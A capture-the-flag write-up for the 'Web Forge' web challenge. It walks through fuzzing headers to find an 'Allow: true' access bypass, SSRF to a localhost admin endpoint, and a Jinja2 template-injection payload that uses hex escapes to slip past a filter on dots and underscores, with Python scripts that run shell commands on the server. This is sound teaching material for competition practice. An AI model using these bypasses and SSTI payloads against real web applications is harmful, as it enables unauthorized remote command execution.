# Web Forge

```
NOTE FROM ADMINS: Use of automated fuzzing tools are allowed for this challenge. Fuzzing. Not Crawling. All endpoints aside from one are rate limited.
https://wormhole.sunshinectf.games/
```

Visit <https://wormhole.sunshinectf.games/fetch>, an error is given:

```
403 Forbidden: missing or incorrect SSRF access header
```

Visit <https://wormhole.sunshinectf.games/robots.txt>, it hints the hidden `/admin` endpoint and the missing header for `/fetch`:

```
User-agent: *
Disallow: /admin
Disallow: /fetch

# internal SSRF testing tool requires special auth header to be set to 'true'
```

Try different auth headers:

```python
import requests

url = "https://wormhole.sunshinectf.games/fetch"
# headers.txt downloaded from https://github.com/devanshbatham/headerpwn/blob/main/headers.txt
headers_to_try = [line.split(":")[0] for line in open("headers.txt")]
values = ["true"]

for h in headers_to_try:
    for v in values:
        r = requests.get(url, headers={h: v}, allow_redirects=False, timeout=5)
        print(f"{h}: {v} -> {r.status_code}")
        if r.status_code != 403:
            print("Possible winner:", h, v)
            print(r.text[:500])
            raise SystemExit
```

The corrent answer is `Allow: true` header. After that, we can access the `/fetch` endpoint. It has a form for ssrf:

```html
<div class="form-group">
    <label for="url">Target URL</label>
    <input type="url" id="url" name="url" placeholder="https://example.com" required>
    <small class="hint">Enter a complete URL including http:// or https://</small>
</div>
```

So we can POST for SSRF. We want to access `/admin`, which seems to only allow access from localhost:

```python
import requests

url = "https://wormhole.sunshinectf.games/fetch"

r = requests.post(
    # not working
    #url, headers={"Allow": "true"}, data={"url": "https://wormhole.sunshinectf.games/admin"}
    # working
    url, headers={"Allow": "true"}, data={"url": "http://127.0.0.1:8000/admin"}
)
print(r.text)
```

It says `Request failed: Missing template parameter`, so the next step is template injection. Try typical Jinja injection payload from <https://onsecurity.io/article/server-side-template-injection-with-jinja2/>, until we find that the server forbids `.` or `_`, but we can still execute arbitrary command with:

```python
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('command')['read']()}}
```

It does work. Then, we only need to read flag out from the local directory:

```python
import requests

url = "https://wormhole.sunshinectf.games/fetch"


def run(cmd):
    r = requests.post(
        url,
        headers={"Allow": "true"},
        data={
            "url": "http://127.0.0.1:8000/admin?template={{request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x5f\\x5fimport\\x5f\\x5f']('os')['popen']('"
            + cmd
            + "')['read']()}}"
        },
    )
    print(r.text)

run("ls -al")
run("cat f*")
```

Flag: `sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}`.
